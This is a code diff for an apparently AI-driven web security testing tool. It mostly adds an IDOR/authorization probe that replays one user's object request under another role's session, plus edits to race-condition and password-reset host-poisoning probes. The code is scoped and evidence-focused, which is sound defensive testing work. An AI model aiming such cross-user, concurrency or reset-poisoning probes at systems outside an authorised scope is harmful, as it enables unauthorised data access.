+          return finish("unverified", { reason: `no usable session for ownerRole '${ownerRole}' (no live/cookie-file session and it is not the active role) — cannot take an owner baseline`, checkStatus: "blocked" });
+        if (cmpH === null)
+          return finish("unverified", { reason: `no usable session for compareRole '${compareRole}' — missing/expired comparison session (no fallback to another role's credentials)`, checkStatus: "blocked" });
+
+        // ── principals (whoami identity binding when identityUrl configured; evidence-linked, session-bound) ──
+        const identityEvidenceIds: string[] = [];
+        for (const r of [ownerRole, compareRole]) {
+          const ev = await establishPrincipal(s, r);
+          if (ev) identityEvidenceIds.push(ev);
+        }
+        // A session the identity endpoint REJECTED is dead — an expired comparison session's 401 is a session
+        // failure, never an authorization signal. Declared principals cannot resurrect it. Block before a
+        // single object leg; the identity evidence above is the trail.
+        const invalid = [ownerRole, compareRole].filter((r) => s.invalidRoleSessions?.has(r));
+        if (invalid.length)
+          return finish("unverified", {
+            reason: `session(s) ${invalid.map((r) => `'${r}'`).join(", ")} rejected by the identity endpoint — expired/invalid session material. Any denial under it is a session failure, not an authorization decision`,
+            checkStatus: "blocked",
+            identityEvidenceIds,
+          });
+        // Session-validated principals outrank operator declarations (the live whoami under THIS session
+        // material is the truth for this comparison's traffic); a declaration applies only when no identity
+        // endpoint exists to observe. A cached principal binds to the session material that produced it —
+        // after credential rotation the stale identity never establishes the new session's principal.
+        const ownerSessRef = sessionRefOf(s.http.effectiveHeaders(ownerH, false));
+        const cmpSessRef0 = sessionRefOf(s.http.effectiveHeaders(cmpH, false));
+        const boundP = (role: string, ref: string): string | undefined => {
+          const b = s.sessionPrincipals?.get(role);
+          return b?.sessionRef === ref ? b.principal : undefined;
+        };
+        const ownerP = boundP(ownerRole, ownerSessRef) ?? s.rolePrincipals?.get(ownerRole);
+        const cmpP = compareRole === "unauth" ? "__anonymous__" : (boundP(compareRole, cmpSessRef0) ?? s.rolePrincipals?.get(compareRole));
+        // Tenant context is operator-established only — the `tenant` tool argument is model input and never
+        // authoritative. Principal identity is a (tenant, principal) tuple: the same local id under a
+        // different established tenant is a different subject.
+        const ownerTenant = s.roleTenants?.get(ownerRole);
+        const cmpTenant = s.roleTenants?.get(compareRole);
+        const sameSubject = !!ownerP && !!cmpP && ownerP === cmpP && (ownerTenant ?? "") === (cmpTenant ?? "");
+        if (sameSubject)
+          return finish("unverified", {
+            reason: `A/B identity collision: '${ownerRole}' and '${compareRole}' resolve to the SAME principal '${ownerP}' in tenant '${ownerTenant ?? "?"}' — this is one account under two labels, not a cross-subject test`,
+            checkStatus: "unverified",
+            identityEvidenceIds,
+          });
+        const tenantBoundary = !!(ownerTenant && cmpTenant && ownerTenant !== cmpTenant);
+        objectTenant = ownerTenant;
+        objectKey = JSON.stringify([rtype, origin, target, objectTenant ?? "", objectId]);
+        cmpSessionHeaders = s.http.effectiveHeaders(cmpH, false);
+        // A 403/denied verdict is only an AUTHORIZATION decision when the compare session is proven live:
+        // an anonymous leg needs no proof (its refusal IS the discrimination); a credentialed leg needs a
+        // whoami binding on THIS material or a demonstrated successful read under the same ref. A declared
+        // principal alone is not session-liveness proof — an expired session's 403/404 is indistinguishable
+        // from an authorization denial otherwise.
+        const cmpSessionLive = () =>
+          Object.keys(cmpH).length === 0 ||
+          s.sessionPrincipals?.get(compareRole)?.sessionRef === cmpSessRef0 ||
+          (s.sessionLiveReads?.has(cmpSessRef0) ?? false);
+
+        // ── typed id placement: {{ID}} placeholders, else the EXACT location the objectId occupies
+        //    (path segment / query value / JSON pointer / named query param / header). Never a blind
+        //    substring on the whole URL — an id inside a host/port/sibling field is never touched. ──
+        const jsonLeaves = (bodyText: string): unknown => {
+          try { return JSON.parse(bodyText); } catch { return undefined; }
+        };
+        const replaceJsonLeaves = (v: unknown, from: string, to: string): boolean => {
+          if (Array.isArray(v)) { let h = false; for (let i = 0; i < v.length; i++) { if (v[i] === from) { v[i] = to; h = true; } else if (typeof v[i] === "object" && v[i] !== null) h = replaceJsonLeaves(v[i], from, to) || h; } return h; }
+          if (v && typeof v === "object") { let h = false; for (const k of Object.keys(v as Record<string, unknown>)) { const o = v as Record<string, unknown>; if (o[k] === from) { o[k] = to; h = true; } else if (typeof o[k] === "object" && o[k] !== null) h = replaceJsonLeaves(o[k], from, to) || h; } return h; }
+          return false;
+        };
+        const placeId = (idVal: string): { url: string; body: string | null; headers: Record<string, string> } | null => {
+          let u = url;
+          let b = body ?? null;
+          if (u.includes("{{ID}}") || (b ?? "").includes("{{ID}}"))
+            return { url: u.replace(/\{\{ID\}\}/g, idVal), body: b == null ? null : b.replace(/\{\{ID\}\}/g, idVal), headers: {} };
+          // Param-directed placement wins when the location is named.
+          if (param?.startsWith("json:") || (param ?? "").startsWith("/")) {
+            if (b == null) return null;
+            const j = jsonLeaves(b);
+            if (j === undefined) return null;
+            const ptr = (param ?? "").replace(/^json:/, "");
+            const segs = ptr.split("/").filter(Boolean);
+            let node = j as Record<string, unknown>;
+            for (let i = 0; i < segs.length - 1; i++) {
+              const nxt = node[segs[i]!];
+              if (!nxt || typeof nxt !== "object") return null;
+              node = nxt as Record<string, unknown>;
+            }
+            const leaf = segs[segs.length - 1]!;
+            if (!(leaf in node)) return null;
+            node[leaf] = idVal;
+            return { url: u, body: JSON.stringify(j), headers: {} };
+          }
+          if (param?.startsWith("header:")) return { url: u, body: b, headers: { [param.slice(7)]: idVal } };
+          try {
+            const uu = new URL(u);
+            let hit = false;
+            if (param && uu.searchParams.has(param)) {
+              uu.searchParams.set(param, idVal);
+              hit = true;
+            } else {
+              // Presence detection — NOT output-diff: replacing "42"→"42" must still count as located.
+              const segs = uu.pathname.split("/");
+              const located = segs.some((seg) => { if (seg === objectId) return true; try { return decodeURIComponent(seg) === objectId; } catch { return false; } });
+              uu.pathname = segs.map((seg) => (seg === objectId || (() => { try { return decodeURIComponent(seg) === objectId; } catch { return false; } })() ? encodeURIComponent(idVal) : seg)).join("/");
+              hit = hit || located;
+              for (const k of [...uu.searchParams.keys()])
+                if (uu.searchParams.get(k) === objectId) { uu.searchParams.set(k, idVal); hit = true; }
+            }
+            if (hit) { u = uu.toString(); return { url: u, body: b, headers: {} }; }
+          } catch { /* not an absolute url */ }
+          if (b != null) {
+            const j = jsonLeaves(b);
+            if (j !== undefined) {
+              if (replaceJsonLeaves(j, objectId, idVal)) return { url: u, body: JSON.stringify(j), headers: {} };
+            } else if (b.includes(objectId)) {
+              return { url: u, body: b.split(objectId).join(idVal), headers: {} };
+            }
+          }
+          return null;
+        };
+
+        const send = async (idVal: string, baseHeaders: Record<string, string>, kind: "negative_control" | "positive_replay", tag: string) => {
+          const placed = placeId(idVal);
+          if (!placed) return null;
+          if (!isInScope(placed.url, s.scope)) return null;
+          const req: HttpRequest = { method: m, url: placed.url, headers: { ...baseHeaders, ...placed.headers }, body: placed.body, inheritDefaultHeaders: false };
+          const res = await s.http.send(req);
+          bumpHttp(s, res.status);
+          const eff = s.http.effectiveHeaders(req.headers, false);
+          const ev = s.evidence.record({
+            screenId: s.currentScreenId ?? "pilot",
+            validator: "veritas-authz",
+            kind,
+            request: { ...req, headers: eff },
+            response: res,
+            note: `authz ${tag}${note ? ` — ${note}` : ""}`,
+          });
+          const sent = { evId: ev.id, status: res.status, body: res.body, gql: parseGraphqlResponse(res.status, res.body), authed: Object.keys(baseHeaders).length > 0 };
+          // A successful object read proves THIS session material is live — a later authenticated
+          // denial under the same ref can then be told apart from session rejection.
+          if (sent.authed && readLeg(sent) === "access") {
+            s.sessionLiveReads ??= new Set();
+            s.sessionLiveReads.add(sessionRefOf(eff));
+          }
+          return sent;
+        };
+        type Sent = NonNullable<Awaited<ReturnType<typeof send>>>;
+
+        // ── leg tiers: an authz DENIAL (401/403/404/gql-authz-error) is distinct from ACCESS (2xx that
+        //    actually carries the intended object) and from INVALID (input/transport/schema/internal
+        //    failure — 400/422/429/5xx, GraphQL errors unrelated to authorization). A transport error or a
+        //    body that never contained the object is neither access nor denial. ──
+        const idInData = (v: unknown, id: string): boolean => {
+          if (v == null) return false;
+          if (typeof v === "string" || typeof v === "number") return String(v) === id;
+          if (Array.isArray(v)) return v.some((x) => idInData(x, id));
+          if (typeof v === "object") return Object.values(v as Record<string, unknown>).some((x) => idInData(x, id));
+          return false;
+        };
+        // The object ID must bind at an IDENTITY field — `id`, `uid`, `uuid`, `*Id`, `*_id` — never at an
+        // arbitrary primitive. An echoed `requestedId:"42"` or a count field that happens to equal the id
+        // is NOT proof the object was served; the record's own identifier must match.
+        const ECHO_KEY = /^(request|requested|query|input|param|filter|search|echo|correlation|parent|related|ref|reference|source|target|original|callback|trace|session|token|redirect|next|return|from|to|by|for|owner|user|account|tenant|created|updated|actor|subject|customer|member|employee|viewer|grant|total|count|length|size|limit|offset|page|qty|amount|age|year|duration|number|num|index|idx|version|rev|depth|level|rating|score|port)/i;
+        const isIdKey = (k: string): boolean => {
+          if (ECHO_KEY.test(k)) return false;
+          if (/^(id|uid|uuid|guid|pk|key|slug)$/i.test(k)) return true;
+          return /(_id$|Id$|_uuid$|Uuid$|_key$|Key$)/.test(k);
+        };
+        const recordHasId = (rec: Record<string, unknown>, id: string): boolean =>
+          Object.entries(rec).some(([k, v]) => isIdKey(k) && (typeof v === "string" || typeof v === "number") && String(v) === id);
+        // The record object that CARRIES the id (for owner-field binding + fallback object detection).
+        const recordWithId = (v: unknown, id: string): Record<string, unknown> | null => {
+          if (!v || typeof v !== "object") return null;
+          if (Array.isArray(v)) { for (const x of v) { const h = recordWithId(x, id); if (h) return h; } return null; }
+          const rec = v as Record<string, unknown>;
+          if (recordHasId(rec, id)) return rec;
+          for (const k of Object.keys(rec)) { const h = recordWithId(rec[k], id); if (h) return h; }
+          return null;
+        };
+        const OWNER_FIELDS = ["ownerId", "owner_id", "userId", "user_id", "customerId", "customer_id", "accountId", "account_id", "memberId", "employeeId", "createdBy", "created_by", "belongsTo", "tenantOwnerId"];
+        // The GraphQL ROOT FIELD the id variable feeds (order(id:$id) → "order"). An id appearing under an
+        // UNRELATED sibling field (health.id === objectId while order is null) is NOT object access — the
+        // response must carry the id inside the targeted field's subtree.
+        const gqlVarName = (() => {
+          const pm = /^(?:json:)?\/?variables\/([^/]+)/.exec(param ?? "") ?? /^(?:json:)?variables\.([^.\/]+)/.exec(param ?? "");
+          if (pm) return pm[1];
+          const parsed = jsonLeaves(body ?? "");
+          const vars = parsed && typeof parsed === "object" ? (parsed as Record<string, unknown>).variables : undefined;
+          if (vars && typeof vars === "object")
+            for (const [k, v] of Object.entries(vars as Record<string, unknown>)) if (idInData(v, objectId)) return k;
+          return undefined;
+        })();
+        const gqlTargetField = (() => {
+          const doc = gqlDesc?.document;
+          if (!doc) return undefined;
+          // Drop the operation's variable-declaration list so its parens don't masquerade as field args.
+          const stripped = doc.replace(/\(\s*\$[\s\S]*?\)\s*(?=\s*\{)/, " () ");
+          if (gqlVarName) {
+            const m = new RegExp(`([_A-Za-z]\\w*)\\s*\\([^)]*\\$${gqlVarName.replace(/[$()*+.?[\\\]^{|}-]/g, "\\$&")}\\b`).exec(stripped);
+            if (m) return m[1];
+          }
+          const argFields = [...stripped.matchAll(/([_A-Za-z]\w*)\s*\([^)]*\)/g)].map((x) => x[1]!).filter((f) => !/^(query|mutation|subscription)$/.test(f));
+          return argFields.length === 1 ? argFields[0] : undefined;
+        })();
+        const carriesId = (r: Sent): boolean => {
+          if (r.gql.kind !== "not-graphql") {
+            if (gqlTargetField) {
+              const v = (r.gql.data ?? {})[gqlTargetField];
+              if (v != null && (typeof v === "string" || typeof v === "number")) return String(v) === objectId;
+              return recordWithId(v, objectId) !== null;
+            }
+            // Target field unresolvable: only an owner-bearing record counts as object access — an unrelated
+            // sibling carrying the same id must never prove the object was read.
+            const rec = recordWithId(r.gql.data, objectId);
+            return !!rec && OWNER_FIELDS.some((f) => f in rec);
+          }
+          // REST: a JSON body must carry the id at a structured identity field — an echoed requestedId
+          // or any other primitive equal to the id is not the object. Non-JSON bodies keep the quoted
+          // heuristic (no structure to bind against).
+          const parsed = jsonLeaves(r.body);
+          if (parsed !== undefined) return recordWithId(parsed, objectId) !== null;
+          const quoted = `"${objectId.replace(/["\\]/g, "\\$&")}"`;
+          return r.body.includes(quoted);
+        };
+        type Leg = "access" | "denied" | "invalid";
+        const readLeg = (r: Sent): Leg => {
+          if (r.gql.kind !== "not-graphql") {
+            // Object presence is decisive: data carrying the object is access even when sibling fields errored
+            // (partial). When the object is ABSENT, an authz error is a denial; a non-authz error is a resolver
+            // failure (invalid — it explains the absence without saying anything about access); a clean answer
+            // that simply doesn't serve the object is the endpoint discriminating (denied). A "not found"
+            // absence error is discrimination too — NOT_FOUND is not a resolver crash.
+            if ((r.gql.kind === "ok" || r.gql.kind === "partial") && carriesId(r)) return "access";
+            if (r.gql.authzDenied) return "denied";
+            const absence = r.gql.errors.length > 0 && r.gql.errors.every((e) => /not.?found/i.test(e.message) || /NOT.?FOUND/i.test(e.code ?? ""));
+            if (absence) return "denied";
+            if (r.gql.errors.length > 0 || r.gql.kind === "errors" || r.gql.kind === "empty") return "invalid";
+            return "denied"; // answered cleanly but the object was not served — the endpoint discriminates
+          }
+          // 401 on a CREDENTIALED leg is a session failure (expired/rejected credentials), not an
+          // authorization verdict — the request never reached the object's authz check. 401 on an
+          // anonymous leg IS the real discrimination (unauthenticated access refused). 403 is an
+          // authenticated-forbidden decision: a genuine authz denial either way.
+          if (r.status === 401) return r.authed ? "invalid" : "denied";
+          if (r.status === 403) return "denied";
+          if (r.status === 404) return "denied"; // endpoint exists, this object hidden/absent for this subject
+          if (r.status >= 200 && r.status < 400) return carriesId(r) ? "access" : "invalid";
+          return "invalid"; // 400/405/415/422/429/5xx — input or transport failure, never a denial
+        };
+
+        try {
+          // ── leg 1: owner baseline — must actually carry the object ──
+          const base = await send(objectId, ownerH, "negative_control", `owner baseline as '${ownerRole}'`);
+          if (!base)
+            return finish("unverified", { reason: "could not build the owner request (objectId not locatable in url/body/param)", checkStatus: "unverified" });
+          const baseLeg = readLeg(base);
+          if (baseLeg !== "access")
+            return finish("unverified", {
+              reason: `owner baseline failed: '${ownerRole}' read of its own ${rtype} ${objectId} → ${baseLeg === "denied" ? "denied" : `invalid (status ${base.status})`} — the claimed owner cannot read the object, so the ownership premise is wrong`,
+              checkStatus: "unverified",
+              ownerEvidenceId: base.evId,
+              identityEvidenceIds,
+            });
+
+          // ── ownership: the object's OWN record must carry an owner field bound to the owner's VERIFIED
+          //    principal (identity-binding). An operator allow rule establishes access, never ownership. ──
+          const root = base.gql.kind !== "not-graphql" ? (gqlTargetField ? (base.gql.data ?? {})[gqlTargetField] : base.gql.data) : jsonLeaves(base.body);
+          const ownerRecord = recordWithId(root, objectId) ?? (root && typeof root === "object" && !Array.isArray(root) ? (root as Record<string, unknown>) : null);
+          const ownerField = ownerRecord ? OWNER_FIELDS.map((f) => ownerRecord[f]).find((v) => typeof v === "string" || typeof v === "number") : undefined;
+          let owner: string | undefined;
+          let ownerBasis: "operator" | "identity-binding" | undefined;
+          if (ownerP && ownerField != null && String(ownerField) === ownerP) {
+            owner = ownerRole;
+            ownerBasis = "identity-binding";
+          }
+
+          // ── expectation: trusted sources ONLY, and ONLY explicit operator policy may establish deny.
+          //    An endpoint constraint must match the actual normalized endpoint AND its origin (a rule for
+          //    https://other.invalid/x can never apply to http://this-host/x). An object's own grant list can
+          //    only establish ALLOW (explicit membership is a positive grant) — ABSENCE from a partial sharing
+          //    list never proves an exhaustive deny (admins/implicit grants legitimately reach objects). A
+          //    role's earlier denial belongs to that PRINCIPAL's session, not the role label — credential
+          //    rotation must not inherit it, so no observed-denial basis exists.
+          const objectTenant = ownerTenant;
+          const ruleFits = (r: ExpectedAccessRule): boolean => {
+            if (r.role !== compareRole) return false;
+            if (r.object !== undefined && r.object !== objectId) return false;
+            if (r.tenant !== undefined && r.tenant !== objectTenant) return false;
+            if (r.endpoint !== undefined) {
+              // The documented endpoint forms each bind what they name — a rule must not silently widen:
+              //   "METHOD path[#op]"  → method + normalized path (+ GraphQL operationKey) all match
+              //   "path#op"           → normalized path + operationKey
+              //   "path"              → normalized path on ANY method/operation
+              //   bare operationKey   → matches only this comparison's GraphQL operationKey
+              const raw = r.endpoint.trim();
+              if (gqlOp !== undefined && raw === gqlOp) {
+                // bare operationKey — binds this operation only (no path constraint)
+                return true;
+              }
+              const withMethod = /^([A-Za-z]+)\s+(\S.*)$/.exec(raw);
+              const afterMethod = withMethod && !/^(query|mutation|subscription)$/i.test(withMethod[1]!) ? withMethod : null;
+              if (afterMethod && afterMethod[1]!.toUpperCase() !== m) return false;
+              const rest = afterMethod ? afterMethod[2]!.trim() : raw;
+              const hashIdx = rest.indexOf("#");
+              const pathPart = hashIdx >= 0 ? rest.slice(0, hashIdx) : rest;
+              const opPart = hashIdx >= 0 ? rest.slice(hashIdx + 1) : undefined;
+              const isAbsolute = /^https?:\/\//i.test(pathPart);
+              if (normEndpoint(pathPart || "/", s.targetUrl) !== endpoint) return false;
+              if (opPart !== undefined && opPart !== (gqlOp ?? "")) return false;
+              // Absolute rule endpoints bind their origin too — a deny written for another host/origin
+              // must not float onto this comparison.
+              if (isAbsolute && webOriginOf(pathPart, s.targetUrl) !== origin) return false;
+            }
+            return true;
+          };
+          const matching = (s.expectedAccess ?? []).filter(ruleFits);
+          const allowRules = matching.filter((r) => r.allow);
+          const denyRules = matching.filter((r) => !r.allow);
+          const ACL_FIELDS = ["acl", "permissions", "sharedWith", "shared_with", "allowedUsers", "allowed_users", "viewers", "members", "grants"];
+          const aclArr = ownerRecord ? ACL_FIELDS.map((f) => ownerRecord[f]).find((v) => Array.isArray(v)) as Array<unknown> | undefined : undefined;
+          const aclIds = aclArr?.map((x) => (x && typeof x === "object" ? (x as Record<string, unknown>).id ?? (x as Record<string, unknown>).principal ?? (x as Record<string, unknown>).userId : x)).map((x) => (x == null ? "" : String(x)));
+          let expectation: "deny" | "allow" | "unknown";
+          let expectationBasis: "operator" | "acl" | "observed-denial" | "none";
+          let ruleConflict = false;
+          if (allowRules.length > 0 && denyRules.length > 0) {
+            expectation = "unknown";
+            expectationBasis = "none";
+            ruleConflict = true; // conflicting operator rules — no direction is safe to assume
+          } else if (allowRules.length > 0) {
+            expectation = "allow";
+            expectationBasis = "operator";
+          } else if (denyRules.length > 0) {
+            expectation = "deny";
+            expectationBasis = "operator";
+          } else if (aclIds && cmpP && aclIds.includes(cmpP)) {
+            expectation = "allow"; // explicit membership is a positive grant — never used to deny
+            expectationBasis = "acl";
+          } else {
+            expectation = "unknown";
+            expectationBasis = "none";
+          }
+
+          // ── leg 2: denied control — a non-existent id AS THE COMPARE role proves the endpoint discriminates ──
+          const fakeId = nonexistentIdLike(objectId);
+          const ctrl = await send(fakeId, cmpH, "negative_control", `denied control (non-existent id) as '${compareRole}'`);
+          const deniedEvidenceIds = ctrl ? [ctrl.evId] : [];
+          const controlDenied = !!ctrl && readLeg(ctrl) === "denied";
+
+          // ── leg 3: compare replays ×2 — EACH must independently carry the object ──
+          const c1 = await send(objectId, cmpH, "positive_replay", `compare read #1 as '${compareRole}'`);
+          if (!c1)
+            return finish("unverified", { reason: "could not build the compare request", checkStatus: "unverified", ownerEvidenceId: base.evId, deniedEvidenceIds, identityEvidenceIds });
+          const compareEvidenceIds: string[] = [c1.evId];
+          const c1Leg = readLeg(c1);
+          let c2: Sent | null = null;
+          if (c1Leg === "access") {
+            c2 = await send(objectId, cmpH, "positive_replay", `compare read #2 as '${compareRole}'`);
+            if (c2) compareEvidenceIds.push(c2.evId);
+          }
+          const c2Leg = c2 ? readLeg(c2) : "invalid";
+          const stable = c1Leg === "access" && c2Leg === "access" && c2!.status === c1.status && Math.abs(c2!.body.length - c1.body.length) <= 64;
+          const bodyClass = classifyCrossUserBody(c1.body, objectId).class;
+          const priv = bodyClass === "sensitive-pii" || bodyClass === "private-object";
+
+          // ── record the object observation (ownership moves atomically with its basis). deniedFor is
+          //    REAL-object denial only — the non-existent-id control is evidence the endpoint discriminates,
+          //    not that this object denies the subject. ──
+          s.store.recordAuthzObject(s.assessmentId, {
+            key: objectKey,
+            resourceType: rtype,
+            objectId,
+            endpoint,
+            operationKey: gqlOp,
+            tenant: objectTenant,
+            observedBy: [ownerRole, ...(c1Leg === "access" ? [compareRole] : [])],
+            deniedFor: c1Leg === "denied" && cmpSessionLive() ? [compareRole] : [],
+            ...(owner && ownerBasis ? { owner, ownerBasis, ownerEvidenceIds: [base.evId] } : {}),
+            evidenceIds: [base.evId, ...deniedEvidenceIds, ...compareEvidenceIds],
+            updatedAt: new Date().toISOString(),
+          });
+
+          // ── outcome — ONE confirm gate: EVERY unexpected-access needs verified owner, established
+          //    distinct principals, a trusted deny expectation, a denied control, and >=2 stable replays
+          //    that each carried the object. Missing prerequisites land in inconclusive/unverified, never
+          //    a finding or a tested-clean. ──
+          const verifiedCtx = !!(owner && cmpP && !sameSubject);
+          const confirmable = verifiedCtx && expectation === "deny" && controlDenied && stable;
+
+          if (c1Leg === "invalid")
+            return finish("unverified", {
+              reason: `compare read was not conclusive (status ${c1.status}${c1.gql.kind !== "not-graphql" ? `, graphql ${c1.gql.kind}` : ""}) — transport/input/schema failure is neither access nor denial`,
+              checkStatus: "unverified",
+              ownerEvidenceId: base.evId,
+              deniedEvidenceIds,
+              compareEvidenceIds,
+              identityEvidenceIds,
+              expectation,
+              expectationBasis,
+              tenantBoundary,
+              owner,
+              ownerBasis,
+            });
+          if (c1Leg === "denied") {
+            if (verifiedCtx && expectation === "deny" && cmpSessionLive())
+              return finish("denied-as-expected", {
+                reason: `'${compareRole}' (principal ${cmpP}) was denied on verified owner '${ownerRole}'s ${rtype} ${objectId} — matches the established deny expectation`,
+                checkStatus: "tested-clean",
+                ownerEvidenceId: base.evId,
+                deniedEvidenceIds: [ctrl ? ctrl.evId : c1.evId],
+                compareEvidenceIds,
+                identityEvidenceIds,
+                expectation,
+                expectationBasis,
+                tenantBoundary,
+                owner,
+                ownerBasis,
+              });
+            const why: string[] = [];
+            if (!cmpSessionLive()) why.push(`compare session liveness unproven — a denial under an unvalidated session can be session rejection, not object authorization (needs a whoami binding or a successful read under '${compareRole}'s session)`);
+            if (!owner) why.push("owner unverified — denial can't be attributed to an owned object");
+            if (!cmpP) why.push(`compare principal for '${compareRole}' not established (session/identity unvalidated)`);
+            if (expectation !== "deny") why.push("no deny expectation (no operator rule / ACL exclusion / prior denial) — 'as expected' is unknowable");
+            return finish("inconclusive", {
+              reason: `denial observed but NOT conclusive: ${why.join("; ")}`,
+              checkStatus: "unverified",
+              ownerEvidenceId: base.evId,
+              deniedEvidenceIds: [ctrl ? ctrl.evId : c1.evId],
+              compareEvidenceIds,
+              identityEvidenceIds,
+              expectation,
+              expectationBasis,
+              tenantBoundary,
+              owner,
+              ownerBasis,
+            });
+          }
+          // compare leg is ACCESS:
+          if (expectation === "allow")
+            return finish("allowed", {
+              reason: `'${compareRole}' access on ${rtype} ${objectId} is expected (${expectationBasis === "operator" ? "operator-declared allow" : "object ACL includes this principal"}) — shared/public/admin surface, not an IDOR`,
+              checkStatus: "tested-clean",
+              ownerEvidenceId: base.evId,
+              deniedEvidenceIds,
+              compareEvidenceIds,
+              identityEvidenceIds,
+              expectation,
+              expectationBasis,
+              tenantBoundary,
+              owner,
+              ownerBasis,
+            });
+          if (confirmable)
+            return finish("unexpected-access", {
+              reason: `'${compareRole}' (principal ${cmpP}${cmpTenant ? `, tenant ${cmpTenant}` : ""}) stably read '${ownerRole}'s ${rtype} ${objectId} against the established DENY expectation (${expectationBasis}); owner verified by ${ownerBasis}, non-existent id denied ⇒ the endpoint discriminates`,
+              checkStatus: "found",
+              ownerEvidenceId: base.evId,
+              deniedEvidenceIds,
+              compareEvidenceIds,
+              identityEvidenceIds,
+              expectation,
+              expectationBasis,
+              tenantBoundary,
+              owner,
+              ownerBasis,
+            });
+          const why: string[] = [];
+          if (!owner) why.push("ownership unverified (no owner field on the object's own record binding to an established principal)");
+          if (!cmpP) why.push(`compare principal for '${compareRole}' not established (no identityUrl/operator principal)`);
+          if (expectation === "unknown") why.push(ruleConflict ? "conflicting operator allow+deny rules for this object/role — expectation ambiguous" : "no deny expectation — legitimate admin/shared/same-tenant grants can't be told from an exposure (declare expectedAccess or an object ACL)");
+          if (!controlDenied) why.push("the non-existent-id control was NOT denied — the endpoint may be a catch-all");
+          if (!stable) why.push("compare replays unstable — not every replay carried the object with a consistent shape");
+          if (!priv) why.push(`response classified '${bodyClass}' (public directory / identity-only)`);
+          return finish("inconclusive", {
+            reason: `access observed but NOT confirmable: ${why.join("; ")}`,
+            checkStatus: "unverified",
+            ownerEvidenceId: base.evId,
+            deniedEvidenceIds,
+            compareEvidenceIds,
+            identityEvidenceIds,
+            expectation,
+            expectationBasis,
+            tenantBoundary,
+            owner,
+            ownerBasis,
+          });
+        } catch (e) {
+          return finish("unverified", { reason: `transport/error: ${String(e).slice(0, 180)}`, checkStatus: "unverified" });
+        }
+      },
+    ),
+
     // ───────────────────────── race condition (concurrency / TOCTOU) ─────────────────────────
     tool(
       "probe_race",
@@ -4806,7 +7705,7 @@ export function buildTools(s: PilotSession) {
         const req: HttpRequest = { method: (method ?? (body != null ? "POST" : "GET")).toUpperCase(), url, headers: authHeaders(s), body: body ?? null };
         const isSuccess = (r: HttpResponse | null): r is HttpResponse => !!r && r.status < 400 && r.body.includes(successMarker);
         const rec = (res: HttpResponse, kind: "negative_control" | "positive_replay", tag: string): string =>
-          s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-race", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `race ${tag}` }).id;
+          s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-race", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) }, response: res, note: `race ${tag}` }).id;
         try {
           // ── concurrent burst: Promise.all fires a real parallel volley (the rate limiter's per-send delay is uniform,
           //    so the batch resolves its waits together and hits ~simultaneously — the concurrency a TOCTOU needs). ──
@@ -4868,7 +7767,7 @@ export function buildTools(s: PilotSession) {
           const res = await s.http.send(req);
           bumpHttp(s, res.status);
           const reflected = res.body.includes(host) || (res.headers["location"] ?? "").includes(host); // attacker host echoed in a URL/Location
-          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-reset-poison", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers) }, response: res, note: `reset-poison ${tag}` });
+          const ev = s.evidence.record({ screenId: s.currentScreenId ?? "pilot", validator: "claude-pilot-reset-poison", kind, request: { ...req, headers: s.http.effectiveHeaders(req.headers, req.inheritDefaultHeaders !== false) }, response: res, note: `reset-poison ${tag}` });
           return { evId: ev.id, status: res.status, reflected };
         };
         try {
@@ -4906,4 +7805,46 @@ export function buildTools(s: PilotSession) {
       },
     ),
   ];
+  // ── check-ledger instrumentation ── every probe's REAL outcome lands in the per-check ledger.
+  //   Explicitly-instrumented tools (probe_idor / probe_authz / record_finding / screen_done / methodology)
+  //   write their own fine-grained rows and are NOT in this map. For the rest, a conservative classifier
+  //   reads the tool's own result text and writes one row per call — an ambiguous result writes NO row
+  //   (never a fabricated clean). The row records the tool, target, param, subject, session ref, and
+  //   any evidence ids the probe itself emitted.
+  return defs.map((d) => {
+    const cls = GENERIC_PROBE_CLASS[d.name];
+    if (!cls) return d;
+    const orig = d.handler;
+    return {
+      ...d,
+      handler: async (args: Record<string, unknown>, extra: unknown) => {
+        const res = await orig(args as never, extra);
+        try {
+          const text = res.content?.[0]?.type === "text" ? (res.content[0] as { text: string }).text : "";
+          // One row per invocation — the extractor resolves the outcome from the probe's own
+          // structured contract (result enum + evidence ids + the baseline leg's recorded status).
+          // Ambiguous/uninstrumented exits become `unverified`, a visible gap — never absent, never clean.
+          const outcome = extractProbeOutcome(s, text);
+          const url = probeArgsUrl(args);
+          const method = probeArgsMethod(args);
+          recordCheck(s, {
+            tool: d.name,
+            checkClass: typeof cls === "function" ? cls(args) : cls,
+            target: url ? checkTargetOf(method, url, s.targetUrl, typeof args.operationKey === "string" ? args.operationKey : undefined) : "*",
+            // `location` (json:/header:/cookie:/path:) IS the input identity when present — a body
+            // `param` would misattribute which location was actually exercised.
+            param: typeof args.location === "string" ? args.location : typeof args.param === "string" ? args.param : undefined,
+            url,
+            status: outcome.status,
+            reason: outcome.reason,
+            baselineOk: outcome.baselineOk,
+            evidenceIds: outcome.evidenceIds,
+          });
+        } catch {
+          /* ledger instrumentation must never break a probe */
+        }
+        return res;
+      },
+    };
+  });
 }
